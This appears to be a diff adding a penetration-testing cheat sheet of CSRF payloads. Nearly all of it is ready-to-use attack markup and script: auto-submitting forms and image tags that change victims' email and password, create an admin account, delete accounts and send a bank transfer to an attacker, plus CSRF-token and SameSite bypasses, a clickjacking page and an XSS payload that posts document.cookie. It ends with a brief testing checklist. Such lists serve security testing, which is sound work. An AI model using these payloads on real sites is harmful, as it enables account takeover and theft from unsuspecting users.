@@ -1,0 +1,247 @@
+# CSRF (Cross-Site Request Forgery) Payloads
+
+## ========================================
+## BASIC CSRF - GET REQUEST
+## ========================================
+
+# Simple Image Tag
+<img src="http://target.com/delete?id=123">
+
+# IFrame
+<iframe src="http://target.com/delete?id=123"></iframe>
+
+# Script Tag
+<script src="http://target.com/delete?id=123"></script>
+
+# Link (requires user click)
+<a href="http://target.com/delete?id=123">Click here</a>
+
+## ========================================
+## BASIC CSRF - POST REQUEST
+## ========================================
+
+# Auto-submit Form
+<html>
+<body onload="document.forms[0].submit()">
+<form action="http://target.com/change-email" method="POST">
+  <input type="hidden" name="email" value="attacker@evil.com">
+  <input type="submit" value="Submit">
+</form>
+</body>
+</html>
+
+# With AJAX
+<script>
+var xhr = new XMLHttpRequest();
+xhr.open("POST", "http://target.com/change-password", true);
+xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+xhr.send("password=newpass123");
+</script>
+
+# Using Fetch API
+<script>
+fetch('http://target.com/api/delete', {
+  method: 'POST',
+  credentials: 'include',
+  headers: {
+    'Content-Type': 'application/json'
+  },
+  body: JSON.stringify({id: 123})
+});
+</script>
+
+## ========================================
+## CSRF WITH JSON
+## ========================================
+
+# Simple Form
+<form action="http://target.com/api/update" method="POST" enctype="text/plain">
+  <input name='{"email":"attacker@evil.com","id":' value='123}'>
+</form>
+
+# Using XMLHttpRequest
+<script>
+var xhr = new XMLHttpRequest();
+xhr.open("POST", "http://target.com/api/update", true);
+xhr.setRequestHeader("Content-Type", "application/json");
+xhr.withCredentials = true;
+var data = '{"email":"attacker@evil.com"}';
+xhr.send(data);
+</script>
+
+## ========================================
+## CSRF TOKEN BYPASS
+## ========================================
+
+# Remove CSRF token parameter
+# Change: email=attacker@evil.com&csrf=TOKEN
+# To: email=attacker@evil.com
+
+# Empty CSRF token
+csrf=
+
+# Use different method (GET instead of POST)
+<img src="http://target.com/change-email?email=attacker@evil.com">
+
+# Use another user's token
+csrf=VICTIM_TOKEN
+
+# Token in custom header bypass
+# If app only checks custom header:
+<form method="POST" action="http://target.com/update" enctype="text/plain">
+  <input name='{"email":"attacker@evil.com"}' value='x'>
+</form>
+
+## ========================================
+## SAME-SITE COOKIE BYPASS
+## ========================================
+
+# Using subdomain takeover
+<form action="http://sub.target.com/update" method="POST">
+  <input type="hidden" name="email" value="attacker@evil.com">
+</form>
+
+# WebSocket CSRF
+<script>
+var ws = new WebSocket('ws://target.com/socket');
+ws.onopen = function() {
+  ws.send('{"action":"delete","id":123}');
+};
+</script>
+
+## ========================================
+## CLICKJACKING + CSRF
+## ========================================
+
+<html>
+<head>
+<style>
+  iframe {
+    position: relative;
+    width: 500px;
+    height: 500px;
+    opacity: 0.1;
+    z-index: 2;
+  }
+  div {
+    position: absolute;
+    top: 300px;
+    left: 60px;
+    z-index: 1;
+  }
+</style>
+</head>
+<body>
+  <div>Click here to win a prize!</div>
+  <iframe src="http://target.com/delete-account"></iframe>
+</body>
+</html>
+
+## ========================================
+## ADVANCED CSRF TECHNIQUES
+## ========================================
+
+# Flash-based CSRF
+<object data="http://target.com/file.swf">
+  <param name="allowScriptAccess" value="always">
+  <param name="flashvars" value="url=http://target.com/delete">
+</object>
+
+# Form with multiple values
+<form action="http://target.com/update" method="POST">
+  <input type="hidden" name="email[]" value="attacker@evil.com">
+  <input type="hidden" name="email[]" value="admin@target.com">
+</form>
+
+# Multipart CSRF
+<form action="http://target.com/upload" method="POST" enctype="multipart/form-data">
+  <input type="hidden" name="file" value="malicious.php">
+</form>
+
+## ========================================
+## CONTENT-TYPE TRICKS
+## ========================================
+
+# text/plain to bypass CORS
+<form action="http://target.com/api/update" method="POST" enctype="text/plain">
+  <input name='{"role":"admin"}' value=''>
+</form>
+
+# This sends: {"role":"admin"}=
+
+## ========================================
+## CSRF WITH XSS
+## ========================================
+
+# Stored XSS triggering CSRF
+<script>
+fetch('http://target.com/api/delete', {
+  method: 'POST',
+  credentials: 'include',
+  body: JSON.stringify({id: document.cookie})
+});
+</script>
+
+## ========================================
+## EXPLOITATION EXAMPLES
+## ========================================
+
+# Change Email
+<form action="https://target.com/account/email" method="POST">
+  <input type="hidden" name="email" value="attacker@evil.com" />
+  <input type="submit" value="Submit" />
+</form>
+<script>document.forms[0].submit();</script>
+
+# Change Password
+<form action="https://target.com/account/password" method="POST">
+  <input type="hidden" name="password" value="newpass123" />
+  <input type="hidden" name="confirm_password" value="newpass123" />
+</form>
+<script>document.forms[0].submit();</script>
+
+# Add Admin User
+<form action="https://target.com/admin/users/create" method="POST">
+  <input type="hidden" name="username" value="attacker" />
+  <input type="hidden" name="password" value="pass123" />
+  <input type="hidden" name="role" value="admin" />
+</form>
+<script>document.forms[0].submit();</script>
+
+# Delete Account
+<img src="https://target.com/account/delete?confirm=yes">
+
+# Money Transfer
+<form action="https://bank.com/transfer" method="POST">
+  <input type="hidden" name="amount" value="1000" />
+  <input type="hidden" name="to_account" value="attacker_account" />
+</form>
+<script>document.forms[0].submit();</script>
+
+## ========================================
+## TESTING CHECKLIST
+## ========================================
+
+1. Check if CSRF tokens are validated
+2. Test removing CSRF token
+3. Test empty CSRF token
+4. Test using another user's token
+5. Test changing HTTP method (POST to GET)
+6. Test Content-Type changes
+7. Test Referer header validation
+8. Test Origin header validation
+9. Test SameSite cookie attribute
+10. Test CORS configuration
+
+## ========================================
+## TOOLS
+## ========================================
+
+# Burp Suite - Generate CSRF PoC
+# Right-click request → Engagement tools → Generate CSRF PoC
+
+# OWASP ZAP
+# Active Scan will detect CSRF vulnerabilities
+
+# Manual Testing
+# Create HTML file with forms and host on attacker server
